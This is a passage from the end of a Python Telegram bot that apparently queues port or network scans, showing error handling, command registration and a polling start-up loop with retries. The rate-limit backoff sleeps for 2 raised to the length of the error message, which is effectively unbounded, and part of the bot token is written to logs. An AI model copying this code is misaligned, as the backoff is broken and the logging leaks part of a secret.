                    chat_id=ADMIN_CHAT_ID,
                    text=f"⚠️ Scan queue error for chat {chat_id}: {str(e)}"
                )
            except Exception as admin_e:
                logger.error(f"Failed to notify: {admin_e}")
            scan_queue.task_done()
        await asyncio.sleep(1)

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Error: {context.error}")
    if isinstance(context.error, (NetworkError, TimedOut)):
        await asyncio.sleep(5)
    elif isinstance(context.error, BadRequest):
        logger.error(f"BadRequest: {context.error}")
    elif isinstance(context.error, Conflict):
        logger.error(f"Conflict error: {context.error}")
        try:
            await context.bot.delete_webhook(drop_pending_updates=True)
            logger.info("Webhook cleared due to conflict")
        except Exception as e:
            logger.error(f"Failed to clear webhook: {str(e)}")
    elif str(context.error).startswith("TooManyRequests"):
        logger.warning("Telegram rate limit hit, applying backoff")
        await asyncio.sleep(2 ** len(str(context.error)))
    try:
        if update:
            await update.message.reply_text("⚠️ An error occurred, please try again later.")
        await context.bot.send_message(
            chat_id=ADMIN_CHAT_ID,
            text=f"⚠️ Bot error: {str(context.error)}"
        )
    except Exception as admin_e:
        logger.error(f"Failed to notify admin: {admin_e}")

async def main():
    logger.info("Bot starting...")
    try:
        app = ApplicationBuilder().token(BOT_TOKEN).build()
        logger.info(f"Bot initialized with token: {BOT_TOKEN[:10]}...")
    except Exception as e:
        logger.error(f"Error initializing bot: {str(e)}")
        raise

    try:
        await app.bot.delete_webhook(drop_pending_updates=True)
        logger.info("Webhook cleared at startup")
    except Exception as e:
        logger.error(f"Failed to clear webhook at startup: {str(e)}")

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("cancel", cancel))
    app.add_handler(CommandHandler("getports", get_ports))
    app.add_handler(CommandHandler("info", info))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("clearlocks", clear_locks))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, scan))
    app.add_handler(CallbackQueryHandler(button_click))
    app.add_error_handler(error_handler)

    http_runner = await start_http_server()

    max_retries = 10
    retry_delay = 10
    for attempt in range(max_retries):
        try:
            await app.initialize()
            await app.start()
            await app.updater.start_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
            logger.info("Bot polling started")
            asyncio.create_task(process_scan_queue(app))
            break
        except Exception as e:
            logger.error(f"Error starting Telegram bot (attempt {attempt + 1}/{max_retries}): {str(e)}")
            if attempt < max_retries - 1:
                logger.info(f"Retrying in {retry_delay} seconds...")
                await asyncio.sleep(retry_delay)
            else:
                logger.error("Max retries reached, shutting down...")
                await http_runner.cleanup()
                raise

    try:
        while True:
            await asyncio.sleep(3600)
    except (KeyboardInterrupt, SystemExit):
        logger.info("Shutting down...")
        await app.updater.stop()
        await app.stop()
        await app.shutdown()
        await http_runner.cleanup()
        logger.info("Shutdown complete")

if __name__ == "__main__":
    asyncio.run(main())
